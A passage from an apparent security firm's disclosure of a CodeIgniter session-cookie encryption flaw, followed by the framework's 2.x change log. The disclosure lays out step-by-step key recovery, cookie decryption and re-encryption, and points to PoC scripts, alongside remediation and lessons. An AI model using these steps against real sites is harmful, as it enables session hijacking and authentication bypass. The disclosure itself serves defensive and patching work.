From the CodeIgniter source we know quite a lot about the structure of the plaintext that will be encrypted. We know it’ll be a serialized PHP array (so the first characters are “a:”), and we know it’ll contain up to 120 characters of our UserAgent. We also know that it’ll be XORed with a 40 byte hexadecimal key that will be the same every time. Based on this, we can perform the following attack (note – I’m not a crypto person, so there may be a much faster/more elegant attack possible):

1. Make a request to the webserver using a known UserAgent (a long string of “z” characters was used, at least 40 are needed), and record the cookie.
2. URL and base64 decode the cookie to get the ciphertext.
3. Generate a list of all possible 4 character hexadecimal keys (0000 – ffff) and try to XOR decode the first four characters of the cookie with them (undoing the \_xor\_merge() method), and then XOR decode the first character with the second character and the third character with the fourth character (undoing \_xor\_encode()).
4. If the decoded string is “a:” (the start of a PHP serialized array), then the first four characters were correct. Note that collisions are possible throughout the process resulting in false positives. We now have 10% of the (hashed) key, so can decrypt 10% of the string (including 10% of our UserAgent, which should have a number of occurrences of the string “zz”.
5. Generate a new list of all possible 2 character hexadecimal strings, and append each of these to the known 4 characters of the key. Try and decode the session with each of these keys, looking for the string “zzz” (indicating that these two characters are correct).
6. Repeat this process adding 2 more bytes to the key each time, and looking for 1 more “z” character until the entire cookie is decrypted.

Throughout this process false positive keys may be identified, which allow another “z” character to be found, but then do not have any following keys that add a further “z”. In this case the 2 characters added must be discarded, and another 2 characters must be found.
This attack was tested against a number of different systems using CodeIgniter, and decryption times were found to be between 4 seconds and 4 minutes. It should be noted that this attack is largely performed offline; only a single request is made to the target webserver.
Once the hashed key has been obtained (we don’t need to break the hash), it is possible to decrypt any session cookie created by the server in real time. It is also possible to re-encrypt cookies that the application will accept as valid.

## PoC

Scripts to perform this attack can be found on the [Dionach GitHub repo](https://github.com/Dionach/CodeIgniterXor):

break.py
This is the main script, and given a target URI will attempt to obtain a cookie and brute force the session key. If this script finds a cookie but fails to decrypt it then the server has Mcrypt installed, and is not vulnerable to the attack.
testkey.py
This script will instantly decode a session cookie using the provided (hashed) key (which needs to be added to the script once it has been obtained using break.py.
encrypt.php
This script is based on the encryption functions used by CodeIgniter, and will take an unencrypted cookie (a serialized PHP array) and encrypt it using the provided key (which needs to be added to the script).

The steps to attack an application are as follows:

1. Use break.py to crack the encryption key used by the application
2. Add this key to testkey.py and encrypt.php
3. Browse to the website to create a valid cookie for your IP/UserAgent
4. Decrypt this cookie with testkey.py
5. Make any desired modifications to the cookie manually, or by patching encrypt.php to add/modify array elements before re-encrypting.
6. Re-encrypt the session cookie and paste it back into your browser.

## Impact

There are three main impacts from this vulnerability.
IP/UserAgent Restriction Bypass
Because the IP and UserAgent are stored in the cookie, an attacker stealing a cookie using XSS will be unable to use it, as their IP and UserAgent will not match the values in the cookie. By decrypting the cookie and modifying these values, an attacker would be able to use this cookie to steal a users’ session.

## Object Injection

The decrypted cookie is passed to an unserialize() function, which could allow an attacker to perform an object injection attack. Inspection of the classes available in CodeIgniter did not reveal any that would be exploitable; however there may be classes used by the applications built on the framework that would allow an attacker to exploit this.
Writing Arbitrary Session Variables
After the session cookie is decrypted any values stored into it are loaded into the CodeIgniter session array ($this->userdata). This allows an attacker to set any session variables they wish. Investigation of a random off-the-shelf project based on CodeIgniter found that this lead to an authentication bypass vulnerability, allowing an attacker to authenticate as a target user with just their email address.

## Resolution

This issue was reported to EllisLab (the company that owns CodeIgniter) on 28th May 2014. They made the decision to require the use of Mcrypt, and to remove the use of the \_xor\_encode() method. [A fixed version (2.2.0)](https://ellislab.com/blog/entry/codeigniter-2.2.0-released) was released on 5th June 2014, which removed the \_xor\_encode() method and required the use of Mcrypt. If upgrading immediately is not an option, then installing the PHP Mcrypt library (usually available in a package called php-mcrypt or php5-mcrypt) and ensuring that this library is used by PHP will resolve this issue.

## Further Research

There are a [large number of projects](https://github.com/EllisLab/CodeIgniter/wiki/Applications-Using-Code-Igniter) built on CodeIgniter which may be exploitable using this vulnerability. Developers of these projects need to verify whether their software is exploitable, and if so take steps to update their version of CodeIgniter, and to make Mcrypt a requirement for their application. There are many potential targets out there, so if you do find an exploitable CodeIgniter based application, then please disclose the vulnerability to them responsibly.

## Lessons

There are a number of lessons that can be taken from this vulnerability:

1. Don’t roll your own encryption.
2. Don’t trust the contents of a session cookie.
3. Don’t unserialize() user-supplied input, even if you think it’s safe to.
4. Don’t silently fall back to weak encryption if strong encryption isn’t available.
5. Make sure that any frameworks or libraries you use have undergone appropriate security testing.

## Find out how we can help with your cyber challenge

Please enter your contact details using the form below for a free, no obligation, quote and we will get back to you as soon as possible. Alternatively, you can email us directly at [[email protected]](/cdn-cgi/l/email-protection#2a485f594e4f5c6a4e4345444b494204494547)

Dionach is a CREST-approved global provider of information security solutions with a wealth of globally recognised certifications including PCI QSA, and ISO 27001. For over two decades, public and private sector organisations across the world have relied on our services to protect their information assets and minimise cyber risk.

![](data:image/svg+xml...)![](https://www.dionach.com/wp-content/uploads/2025/01/logo-dark-2025.webp)

T: +44 (0)1865 877830

E: [[email protected]](/cdn-cgi/l/email-protection#6c04090000032c080503020d0f04420f0301)

#### The Company

[About Us](/about-us/)

[Research](/research/)

[Resources](/resources/)

[Careers](/careers/)

#### Services

[Assurance](/services/assurance/)

[Compliance](/services/compliance/)

[Response](/services/response/)

[Healthcare](/services/healthcare/)

#### Stay up to date

[Facebook-f](https://www.facebook.com/dionachcyber)

[X-twitter](https://twitter.com/dionachcyber)

[Linkedin-in](https://uk.linkedin.com/company/dionach-ltd)

[Instagram](https://www.instagram.com/dionachcyber/)

[Contact](https://www.dionach.com/contact/)   [Privacy Policy](https://www.dionach.com/privacy-policy-2/)   [Terms and Conditions](https://www.dionach.com/terms-and-conditions/)

Contact Us

#### Contact Us Reach out to one of our cyber experts and we will arrange a call

![](https://px.ads.linkedin.com/collect/?pid=5414801&fmt=gif)

![](https://px.ads.linkedin.com/collect/?pid=5414801&fmt=gif)



=== Content from codeigniter.com_32411922_20250126_004959.html ===


![Toggle Table of Contents](./images/nav_toggle_darker.jpg "Toggle Table of Contents")

| CodeIgniter User Guide Version 2.2.6 | [Table of Contents Page](./toc.html) |
| --- | --- |

| [CodeIgniter Home](https://codeigniter.com/)  ›  [User Guide Home](index.html)  ›  Change Log | Search User Guide |
| --- | --- |

# Change Log

## Version 2.2.6

Release Date: October 31, 2015

* **Security**
  + Fixed an XSS attack vector in [Security Library](libraries/security.html) method `xss_clean()`.
  + Changed [Config Library](libraries/config.html) method `base_url()` to fallback to ``$\_SERVER['SERVER\_ADDR']`` in order to avoid Host header injections.
  + Changed [CAPTCHA Helper](helpers/captcha_helper.html) to try to use the operating system's PRNG first.

## Version 2.2.5

Release Date: October 8, 2015

* **Security**
  + Fixed a number of XSS attack vectors in [Security Library](libraries/security.html) method `xss_clean()` (thanks to Frans Rosén from [Detectify](https://detectify.com/)).

## Version 2.2.4

Release Date: August 20, 2015

* **Security**
  + Fixed an SQL injection vulnerability in [Active Record](database/active_record.html) method `offset()`.

## Version 2.2.3

Release Date: July 14, 2015

* **Security**
  + Removed a fallback to `mysql_escape_string()` in the 'mysql' database driver (`escape_str()` method) when there's no active database connection.

## Version 2.2.2

Release Date: April 15, 2015

* **Security**
  + Added HTTP "Host" header character validation to prevent cache poisoning attacks when `base_url` auto-detection is used.
  + Added `FSCommand` and `seekSegmentTime` to the "evil attributes" list in `CI_Security::xss_clean()`.

### Bug fixes:

* Fixed a bug (#3665) - `CI_Security::entity_decode()` triggered warnings under some circumstances.

## Version 2.2.1

Release Date: January 22, 2015

* General Changes
  + Improved security in `xss_clean()`.
  + Updated timezones in [Date Helper](helpers/date_helper.html).

### Bug fixes:

* Fixed a bug (#3094) - `CI_Input::_clean_input_data()` breaks encrypted session cookies.
* Fixed a bug (#2268) - `CI_Security::xss_clean()` didn't properly match JavaScript events.
* Fixed a bug (#3309) - `CI_Security::xss_clean()` used an overly-invasive pattern to strip JS event handlers.
* Fixed a bug (#2771) - `CI_Security::xss_clean()` didn't take into account HTML5 entities.
* Fixed a bug (#73) - `CI_Security::sanitize_filename()` could be tricked by an XSS attack.
* Fixed a bug (#2681) - `CI_Security::entity_decode()` used the PREG\_REPLACE\_EVAL flag, which is deprecated since PHP 5.5.
* Fixed a bug (#3302) - Internal function `get_config()` triggered an E\_NOTICE message on PHP 5.6.
* Fixed a bug (#2508) - [Config Library](libraries/config.html) didn't properly detect if the current request is via HTTPS.
* Fixed a bug (#3314) - SQLSRV [Database driver](database/index.html)'s method `count_all()` didn't escape the supplied table name.
* Fixed a bug (#3404) - MySQLi [Database driver](database/index.html)'s method `escape_str()` had a wrong fallback to `mysql_escape_string()` when there was no active connection.
* Fixed a bug in the [Session Library](libraries/sessions.html) where session ID regeneration occurred during AJAX requests.

## Version 2.2.0

Release Date: June 5, 2014

* General Changes
  + **Security:** The `xor_encode()` method in the Encrypt Class has been removed. The Encrypt Class now requires the Mcrypt extension to be installed.
  + **Security:** The [Session Library](libraries/sessions.html) now uses HMAC authentication instead of a simple MD5 checksum.

### Bug fixes for 2.2.0:

* Fixed an edge case (#2583) in the [Email Library](libraries/email.html) where [Suhosin](http://www.hardened-php.net/suhosin/) blocked messages sent via `mail()` due to trailing newspaces in headers.
* Fixed a bug (#696) - make `oci_execute()` calls inside `num_rows()` non-committing, since they are only there to reset which row is next in line for oci\_fetch calls and thus don't need to be committed.
* Fixed a bug (#2689) - [Database Forge Class](database/forge.html) methods `create_table()`, `drop_table()` and `rename_table()` produced broken SQL for tge 'sqlsrv' driver.
* Fixed a bug (#2427) - PDO [Database driver](database/index.html) didn't properly check for query failures.
* Fixed a bug in the [Session Library](libraries/sessions.html) where authentication was not performed for encrypted cookies.

## Version 2.1.4

Release Date: July 8, 2013

* General Changes
  + Improved security in `xss_clean()`.

### Bug fixes for 2.1.4:

* Fixed a bug (#1936) - [Migrations Library](libraries/migration.html) method `latest()` had a typo when retrieving language values.
* Fixed a bug (#2021) - [Migrations Library](libraries/migration.html) configuration file was mistakenly using Windows style line feeds.
* Fixed a bug (#1273) - [Active Record](database/active_record.html) method `set_update_batch()` was using the incorrect variables and would cause an error.
* Fixed a bug (#2337) - [Email Library](libraries/email.html) method `print_debugger()` was not using `htmlspecialchars()` when being shown in the browser.

## Version 2.1.3

Release Date: October 8, 2012

### Bug fixes for 2.1.3:

* Fixed a bug (#1543) - [File-based Caching](libraries/caching.html#file) method `get_metadata()` used a non-existent array key to look for the TTL value.
* Fixed a bug (#1314) - [Session Library](libraries/session.html) method `sess_destroy()` didn't destroy the userdata array.
* Fixed a bug where the [Profiler Library](libraries/profiler.html) issued an E\_WARNING error if [Session](libraries/session.html) userdata contains objects.
* Fixed a bug (#1699) - [Migration Library](libraries/migration.html) ignored the `$config['migration_path']` setting.
* Fixed a bug (#227) - [Input Library](libraries/input.html) allowed unconditional spoofing of HTTP clients' IP addresses through the HTTP\_CLIENT\_IP header.
* Fixed a bug (#907) - [Input Library](libraries/input.html) ignored HTTP\_X\_CLUSTER\_CLIENT\_IP and HTTP\_X\_CLIENT\_IP headers when checking for proxies.
* Fixed a bug (#940) - `csrf_verify()` used to set the CSRF cookie while processing a POST request with no actual POST data, which resulted in validating a request that should be considered invalid.
* Fixed a bug in the [Security Library](libraries/security.html) where a CSRF cookie was created even if `$config['csrf_protection']` is set tot FALSE.
* Fixed a bug (#1715) - [Input Library](libraries/input.html) triggered `csrf_verify()` on CLI requests.

## Version 2.1.2

Release Date: June 29, 2012

* General Changes
  + Improved security in `xss_clean()`.

## Version 2.1.1

Release Date: June 12, 2012

* General Changes
  + Fixed support for docx, xlsx files in mimes.php.
* Libraries
  + Further improved MIME type detection in the [File Uploading Library](libraries/file_uploading.html).
  + Added support for IPv6 to the [Input Library](libraries/input.html).
  + Added support for the IP format parameter to the [Form Validation Library](libraries/form_validation.html).
* Helpers
  + `url_title()` performance and output improved. You can now use any string as the word delimiter. Backwards compatible with 'dash' or 'underscore' as words delimiters.

### Bug fixes for 2.1.1

* Fixed a bug (#697) - A wrong array key was used in the Upload library to check for mime-types.
* Fixed a bug - form\_open() compared $action against site\_url() instead of base\_url()
* Fixed a bug - CI\_Upload::\_file\_mime\_type() could've failed if mime\_content\_type() is used for the detection and returns FALSE.
* Fixed a bug (#538) - Windows paths were ignored when using the [Image Manipulation Class](libraries/image_lib.html) to create a new file.
* Fixed a bug - When database caching was enabled, $this->db->query() checked the cache before binding variables which resulted in cached queries never being found.
* Fixed a bug - CSRF cookie value was allowed to be any (non-empty) string before being written to the output, making code injection a risk.
* Fixed a bug (#726) - PDO put a 'dbname' argument in it's connection string regardless of the database platform in use, which made it impossible to use SQLite.
* Fixed a bug - CI\_DB\_pdo\_result::num\_rows() was not returning properly value with SELECT queries, cause it was relying on PDOStatement::rowCount().
* Fixed a bug (#1059) - CI\_Image\_lib::clear() was not correctly clearing all necessary object properties, namely width and height.

## Version 2.1.0

Release Date: November 14, 2011

* General Changes
  + Fixed a potential parameter injection flaw in the [Security Library](libraries/security.html) and strengthened the XSS filter for HTML5 vulnerabilites.
  + Callback validation rules can now accept parameters like any other validation rule.
  + Added html\_escape() to the [Common functions](general/common_functions.html) to escape HTML output for preventing XSS easliy.
* Helpers
  + Added `increment_string()` to [String Helper](helpers/string_helper.html) to turn "foo" into "foo-1" or "foo-1" into "foo-2".
  + Altered form helper - made action on form\_open\_multipart helper function call optional. Fixes (#65)
  + `url_title()` will now trim extra dashes from beginning and end.
  + Improved speed of [String Helper](helpers/string_helper.html)'s **random\_string()** method
* Database
  + Added a [CUBRID](http://www.cubrid.org/) driver to the [Database driver](libraries/database.html). Thanks to the CUBRID team for supplying this patch.
  + Added a [PDO](http://www.php.net/manual/en/intro.pdo.php) driver to the [Database driver](libraries/database.html).
  + Typecast limit and offset in the [Database driver](database/queries.html) to integers to avoid possible injection.
  + Added additional option 'none' for the optional third argument for `$this->db->like()` in the [Database driver](database/active_record.html).
  + Added `$this->db->insert_batch()` support to the OCI8 (Oracle) driver.
* Libraries
  + Changed `$this->cart->insert()` in the [Cart library](libraries/cart.html) to return the Row ID if a single item was inserted successfully.
  + Added support to set an optional parameter in your callback rules of validation using the [Form Validation library](libraries/form_validation.html).
  + Added a [Migration library](libraries/migration.html) to assist with applying incremental updates to your database schema.
  + Driver children can be located in any package path.
  + Added `is_unique` to the [Form Validation library](libraries/form_validation.html).
  + Added `$config['use_page_numbers']` to the [Pagination library](libraries/pagination.html), which enables real page numbers in the URI.
  + Added TLS and SSL Encryption for SMTP.
* Core
  + Changed private functions in [URI library](libraries/cart.html) to protected so MY\_URI can override them.
  + Removed `CI_CORE` boolean constant from CodeIgniter.php (there are no longer different Reactor and Core versions).

### Bug fixes for 2.1.0

* Fixed #378 Robots identified as regular browsers by the [User Agent class](libraries/user_agent.html).
* If a config class was loaded first then a library with the same name is loaded, the config would be ignored.
* Fixed a bug (Reactor #19) where 1) the 404\_override route was being ignored in some cases, and 2) auto-loaded libraries were not available to the 404\_override controller when a controller existed but the requested method did not.
* Fixed a bug (Reactor #89) where MySQL export would fail if the table had hyphens or other non alphanumeric/underscore characters.
* Fixed a bug (#200) where MySQL queries would be malformed after calling `$this->db->count_all()` then $this->db->get()
* Fixed bug #105 that stopped query errors from being logged unless database debugging was enabled
* Fixed a bug (#160) - Removed unneeded array copy in the file cache driver.
* Fixed a bug (#150) - `field_data()` now correctly returns column length.
* Fixed a bug (#8) - `load_class()` now looks for core classes in `APPPATH` first, allowing them to be replaced.
* Fixed a bug (#24) - ODBC database driver called incorrect parent in \_\_construct().
* Fixed a bug (#85) - OCI8 (Oracle) database `escape_str()` function did not escape correct.
* Fixed a bug (#344) - Using schema found in [Saving Session Data to a Database](libraries/sessions.html), system would throw error "user\_data does not have a default value" when deleting then creating a session.
* Fixed a bug (#112) - OCI8 (Oracle) driver didn't pass the configured database character set when connecting.
* Fixed a bug (#182) - OCI8 (Oracle) driver used to re-execute the statement whenever num\_rows() is called.
* Fixed a bug (#82) - WHERE clause field names in the DB `update_string()` method were not escaped, resulting in failed queries in some cases.
* Fixed a bug (#89) - Fix a variable type mismatch in DB `display_error()` where an array is expected, but a string could be set instead.
* Fixed a bug (#467) - Suppress warnings generated from `get_magic_quotes_gpc()` (deprecated in PHP 5.4)
* Fixed a bug (#484) - First time `_csrf_set_hash()` is called, hash is never set to the cookie (in Security.php).
* Fixed a bug (#60) - Added `_file_mime_type()` method to the [File Uploading Library](libraries/file_uploading.html) in order to fix a possible MIME-type injection (also fixes bug #394).
* Fixed a bug (#537) - Support for all wav type in browser.
* Fixed a bug (#576) - Using `ini_get()` function to detect if apc is enabled or not.
* Fixed invalid date time format in [Date helper](helpers/date_helper.html) and [XMLRPC library](libraries/xmlrpc.html).

## Version 2.0.3

Release Date: August 20, 2011

* Security
  + An improvement was made to the MySQL and MySQLi drivers to prevent exposing a potential vector for SQL injection on sites using multi-byte character sets in the database client connection.

    An incompatibility in PHP versions < 5.2.3 and MySQL < 5.0.7 with *mysql\_set\_charset()* creates a situation where using multi-byte character sets on these environments may potentially expose a SQL injection attack vector. Latin-1, UTF-8, and other "low ASCII" character sets are unaffected on all environments.

    If you are running or considering running a multi-byte character set for your database connection, please pay close attention to the server environment you are deploying on to ensure you are not vulnerable.
* General Changes
  + Fixed a bug where there was a misspelling within a code comment in the index.php file.
  + Added Session Class userdata to the output profiler. Additionally, added a show/hide toggle on HTTP Headers, Session Data and Config Variables.
  + Removed internal usage of the `EXT` constant.
  + Visual updates to the welcome\_message view file and default error templates. Thanks to [danijelb](https://bitbucket.org/danijelb) for the pull request.
  + Added "application/x-csv" to mimes.php.
  + Fixed a bug where [Email library](libraries/email.html) attachments with a "." in the name would using invalid MIME-types.
  + Callback validation rules can now accept parameters like any other validation rule.
* Helpers
  + Added an optional third parameter to `heading()` which allows adding html attributes to the rendered heading tag.
  + `form_open()` now only adds a hidden (Cross-site Reference Forgery) protection field when the form's action is internal and is set to the post method. (Reactor #165)
  + Re-worked `plural()` and `singular()` functions in the [Inflector helper](helpers/inflector_helper.html) to support considerably more words.
* Libraries
  + Altered Session to use a longer match against the user\_agent string. See upgrade notes if using database sessions.
  + Added `is_unique` to the [Form Validation library](libraries/form_validation.html).
  + Added `$this->db->set_dbprefix()` to the [Database Driver](database/queries.html).
  + Changed `$this->cart->insert()` in the [Cart Library](libraries/cart.html) to return the Row ID if a single item was inserted successfully.
  + Added `$this->load->get_var()` to the [Loader library](libraries/loader.html) to retrieve global vars set with `$this->load->view()` and `$this->load->vars()`.
  + Changed `$this->db->having()` to insert quotes using escape() rather than escape\_str().

### Bug fixes for 2.0.3

* Added ENVIRONMENT to reserved constants. (Reactor #196)
* Changed server check to ensure SCRIPT\_NAME is defined. (Reactor #57)
* Removed `APPPATH.'third_party'` from the packages autoloader to negate needless file stats if no packages exist or if the developer does not load any other packages by default.
* Fixed a bug (Reactor #231) where Sessions Library database table example SQL did not contain an index on last\_activity. See [Upgrade Notes](installation/upgrade_203.html).
* Fixed a bug (Reactor #229) where the Sessions Library example SQL in the documentation contained incorrect SQL.
* Fixed a bug (Core #340) where when passing in the second parameter to $this->db->select(), column names in subsequent queries would not be properly escaped.
* Fixed issue #199 - Attributes passed as string does not include a space between it and the opening tag.
* Fixed a bug where the method `$this->cart->total_items()` from [Cart Library](libraries/cart.html) now returns the sum of the quantity of all items in the cart instead of your total count.
* Fixed a bug where not setting 'null' when adding fields in db\_forge for mysql and mysqli drivers would default to NULL instead of NOT NULL as the docs suggest.
* Fixed a bug where using `$this->db->select_max(), $this->db->select_min(), etc could throw notices. Thanks to w43l for the patch.`
* Replace checks for STDIN with php\_sapi\_name() == 'cli' which on the whole is more reliable. This should get parameters in crontab working.

## Version 2.0.2

Release Date: April 7, 2011

Hg Tag: v2.0.2

* General changes
  + The [Security library](./libraries/security.html) was moved to the core and is now loaded automatically. Please remove your loading calls.
  + The CI\_SHA class is now deprecated. All supported versions of PHP provide a `sha1()` function.
  + `constants.php` will now be loaded from the environment folder if available.
  + Added language key error logging
  + Made Environment Support optional. Comment out or delete the constant to stop environment checks.
  + Added Environment Support for Hooks.
  + Added CI\_ Prefix to the [Cache driver](libraries/caching.html).
  + Added [CLI usage](./general/cli.html) documentation.
* Helpers
  + Removed the previously deprecated `dohash()` from the [Security helper](./helpers/security_helper.html); use `do_hash()` instead.
  + Changed the 'plural' function so that it doesn't ruin the captalization of your string. It also take into consideration acronyms which are all caps.
* Database
  + `$this->db->count_all_results()` will now return an integer instead of a string.

### Bug fixes for 2.0.2

* Fixed a bug (Reactor #145) where the Output Library had parse\_exec\_vars set to protected.
* Fixed a bug (Reactor #80) where is\_really\_writable would create an empty file when on Windows or with safe\_mode enabled.
* Fixed various bugs with User Guide.
* Added is\_cli\_request() method to documentation for [Input class](libraries/input.html).
* Added form\_validation\_lang entries for `decimal`, `less_than` and `greater_than`.
* [Fixed issue #153](https://bitbucket.org/ellislab/codeigniter-reactor/issue/153/escape-str-bug-in-mssql-driver) Escape Str Bug in MSSQL driver.
* [Fixed issue #172](https://bitbucket.org/ellislab/codeigniter-reactor/issue/172/bug-in-chrome-and-form_open-in-201) Google Chrome 11 posts incorrectly when action is empty.

## Version 2.0.1

Release Date: March 15, 2011

Hg Tag: v2.0.1

* General changes
  + Added `$config['cookie_secure']` to the config file to allow requiring a secure (HTTPS) in order to set cookies.
  + Added the constant `CI_CORE` to help differentiate between Core: TRUE and Reactor: FALSE.
  + Added an `ENVIRONMENT` constant in index.php, which affects PHP error reporting settings, and optionally,
    which configuration files are loaded (see below). Read more on the [Handling Environments](general/environments.html) page.
  + Added support for [environment-specific](libraries/config.html#environments) configuration files.
* Libraries
  + Added `decimal`, `less_than` and `greater_than` rules to the [Form validation Class](libraries/form_validation.html).
  + [Input Class](libraries/input.html) methods `post()` and `get()` will now return a full array if the first argument is not provided.
  + Secure cookies can now be made with the `set_cookie()` helper and [Input Class](libraries/input.html) method.
  + Added `set_content_type()` to [Output Class](libraries/output.html) to set the output `Content-Type` HTTP header based on a MIME Type or a config/mimes.php array key.
  + [Output Class](libraries/output.html) will now support method chaining.
* Helpers
  + Changed the logic for `form_open()` in [Form helper](helpers/form_helper.html). If no value is passed it will submit to the current URL.

### Bug fixes for 2.0.1

* CLI requests can now be run from any folder, not just when CD'ed next to index.php.
* Fixed issue #41: Added audio/mp3 mime type to mp3.
* Fixed a bug (Core #329) where the file caching driver referenced the incorrect cache directory.
* Fixed a bug (Reactor #69) where the SHA1 library was named incorrectly.

## Version 2.0.0

Release Date: January 28, 2011

Hg Tag: v2.0.0

* General changes
  + PHP 4 support is removed. CodeIgniter now requires PHP 5.1.6.
  + Scaffolding, having been deprecated for a number of versions, has been removed.
  + Plugins have been removed, in favor of Helpers. The CAPTCHA plugin has been converted to a Helper and [documented](./helpers/captcha_helper.html). The JavaScript calendar plugin was removed due to the ready availability of great JavaScript calendars, particularly with jQuery.
  + Added new special Library type: [Drivers](./general/drivers.html).
  + Added full query-string support. See the config file for details.
  + Moved the application folder outside of the system folder.
  + Moved system/cache and system/logs directories to the application directory.
  + Added routing overrides to the main index.php file, enabling the normal routing to be overridden on a per "index" file basis.
  + Added the ability to set config values (or override config values) directly from data set in the main index.php file. This allows a single application to be used with multiple front controllers, each having its own config values.
  + Added `$config['directory_trigger']` to the config file so that a controller sub-directory can be specified when running \_GET strings instead of URI segments.
  + Added ability to set "Package" paths - specific paths where the Loader and Config classes should try to look first for a requested file. This allows distribution of sub-applications with their own libraries, models, config files, etc. in a single "package" directory. See the [Loader class](libraries/loader.html) documentation for more details.
  + In-development code is now hosted at [BitBucket](https://bitbucket.org/ellislab/codeigniter-reactor/).
  + Removed the deprecated Validation Class.
  + Added CI\_ Prefix to all core classes.
  + Package paths can now be set in application/config/autoload.php.
  + [Upload library](libraries/file_uploading.html) file\_name can now be set without an extension, the extension will be taken from the uploaded file instead of the given name.
  + In [Database Forge](database/forge.html) the name can be omitted from $this->dbforge->modify\_column()'s 2nd param if you aren't changing the name.
  + `$config['base_url']` is now empty by default and will guess what it should be.
  + Enabled full Command Line Interface compatibility with `config['uri_protocol'] = 'CLI';`.* Libraries
    + Added a [Cache driver](libraries/caching.html) with APC, memcached, and file-based support.
    + Added $prefix, $suffix and $first\_url properties to [Pagination library](./libraries/pagination.html).
    + Added the ability to suppress first, previous, next, last, and page links by setting their values to FALSE in the [Pagination library](./libraries/pagination.html).
    + Added [Security library](./libraries/security.html), which now contains the xss\_clean function, filename\_security function and other security related functions.
    + Added CSRF (Cross-site Reference Forgery) protection to the [Security library](./libraries/security.html).
    + Added $parse\_exec\_vars property to Output library.
    + Added ability to enable / disable individual sections of the [Profiler](general/profiling.html)
    + Added a wildcard option `$config['allowed_types'] = '*'` to the [File Uploading Class](./libraries/file_uploading.html).
    + Added an 'object' config variable to the XML-RPC Server library so that one can specify the object to look for requested methods, instead of assuming it is in the $CI superobject.
    + Added "is\_object" into the list of unit tests capable of being run.
    + Table library will generate an empty cell with a blank string, or NULL value.
    + Added ability to set tag attributes for individual cells in the Table library
    + Added a `parse_string()` method to the [Parser Class](libraries/parser.html).
    + Added HTTP headers and Config information to the [Profiler](general/profiling.html) output.
    + Added Chrome and Flock to the list of detectable browsers by `browser()` in the [User Agent Class](libraries/user_agent.html).
    + The [Unit Test Class](libraries/unit_testing.html) now has an optional "notes" field available to it, and allows for discrete display of test result items using `$this->unit->set_test_items()`.
    + Added a `$xss_clean` class variable to the XMLRPC library, enabling control over the use of the Security library's `xss_clean()` method.
    + Added a `download()` method to the [FTP library](libraries/ftp.html)
    + Changed `do_xss_clean()` to return FALSE if the uploaded file fails XSS checks.
    + Added stripslashes() and trim()ing of double quotes from $\_FILES type value to standardize input in Upload library.
    + Added a second parameter (boolean) to `$this->zip->read_dir('/path/to/directory', FALSE)` to remove the preceding trail of empty folders when creating a Zip archive. This example would contain a zip with "directory" and all of its contents.
    + Added ability in the Image Library to handle PNG transparency for resize operations when using the GD lib.
    + Modified the Session class to prevent use if no encryption key is set in the config file.
    + Added a new config item to the Session class `sess_expire_on_close` to allow sessions to auto-expire when the browser window is closed.
    + Improved performance of the Encryption library on servers where Mcrypt is available.
    + Changed the default encryption mode in the Encryption library to CBC.
    + Added an `encode_from_legacy()` method to provide a way to transition encrypted data from CodeIgniter 1.x to CodeIgniter 2.x.
      Please see the [upgrade instructions](./installation/upgrade_200.html) for details.
    + Altered Form\_Validation library to allow for method chaining on `set_rules()`, `set_message()` and `set_error_delimiters()` functions.
    + Altered Email Library to allow for method chaining.
    + Added `request_headers()`, `get_request_header()` and `is_ajax_request()` to the input class.
    + Altered [User agent library](libraries/user_agent.html) so that `is_browser()`, `is_mobile()` and `is_robot()` can optionally check for a specific browser or mobile device.
    + Altered [Input library](libraries/input.html) so that `post()` and `get()` will return all POST and GET items (respectively) if there are no parameters passed in.
  * Database
    + [database configuration](./database/configuration.html).
    + Added `autoinit` value to [database configuration](./database/configuration.html).
    + Added `stricton` value to [database configuration](./database/configuration.html).
    + Added `database_exists()` to the [Database Utilities Class](database/utilities.html).
    + Semantic change to db->version() function to allow a list of exceptions for databases with functions to return version string instead of specially formed SQL queries. Currently this list only includes Oracle and SQLite.
    + Fixed a bug where driver specific table identifier protection could lead to malformed queries in the `field_data()` functions.
    + Fixed a bug where an undefined class variable was referenced in database drivers.
    + Modified the database errors to show the filename and line number of the problematic query.
    + Removed the following deprecated functions: orwhere, orlike, groupby, orhaving, orderby, getwhere.
    + Removed deprecated \_drop\_database() and \_create\_database() functions from the db utility drivers.
    + Improved dbforge create\_table() function for the Postgres driver.
  * Helpers
    + Added `convert_accented_characters()` function to [text helper](./helpers/text_helper.html).
    + Added accept-charset to the list of inserted attributes of `form_open()` in the [Form Helper](helpers/form_helper.html).
    + Deprecated the `dohash()` function in favour of `do_hash()` for naming consistency.
    + Non-backwards compatible change made to `get_dir_file_info()` in the [File Helper](helpers/file_helper.html). No longer recurses
      by default so as to encourage responsible use (this function can cause server performance issues when used without caution).
    + Modified the second parameter of `directory_map()` in the [Directory Helper](helpers/directory_helper.html) to accept an integer to specify recursion depth.
    + Modified `delete_files()` in the [File Helper](helpers/file_helper.html) to return FALSE on failure.
    + Added an optional second parameter to `byte_format()` in the [Number Helper](helpers/number_helper.html) to allow for decimal precision.
    + Added alpha, and sha1 string types to `random_string()` in the [String Helper](helpers/string_helper.html).
    + Modified `prep_url()` so as to not prepend http:// if the supplied string already has a scheme.
    + Modified `get_file_info` in the file helper, changing filectime() to filemtime() for dates.
    + Modified `smiley_js()` to add optional third parameter to return only the javascript with no script tags.
    + The `img()` function of the [HTML helper](./helpers/html_helper.html) will now generate an empty string as an alt attribute if one is not provided.
    + If CSRF is enabled in the application config file, `form_open()` will automatically insert it as a hidden field.
    + Added `sanitize_filename()` into the [Security helper](./helpers/security_helper.html).
    + Added `ellipsize()` to the [Text Helper](./helpers/text_helper.html)
    + Added `elements()` to the [Array Helper](./helpers/array_helper.html)
  * Other Changes
    + Added an optional second parameter to `show_404()` to disable logging.
    + Updated loader to automatically apply the sub-class prefix as an option when loading classes. Class names can be prefixed with the standard "CI\_" or the same prefix as the subclass prefix, or no prefix at all.
    + Increased randomness with `is_really_writable()` to avoid file collisions when hundreds or thousands of requests occur at once.
    + Switched some DIR\_WRITE\_MODE constant uses to FILE\_WRITE\_MODE where files and not directories are being operated on.
    + `get_mime_by_extension()` is now case insensitive.
    + Added "default" to the list [Reserved Names](general/reserved_names.html).
    + Added 'application/x-msdownload' for .exe files and ''application/x-gzip-compressed' for .tgz files to config/mimes.php.
    + Updated the output library to no longer compress output or send content-length headers if the server runs with zlib.output\_compression enabled.
    + Eliminated a call to is\_really\_writable() on each request unless it is really needed (Output caching)
    + Documented `append_output()` in the [Output Class](libraries/output.html).
    + Documented a second argument in the `decode()` function for the [Encryption Class](libraries/encryption.html).
    + Documented db->close().
    + Updated the router to support a default route with any number of segments.
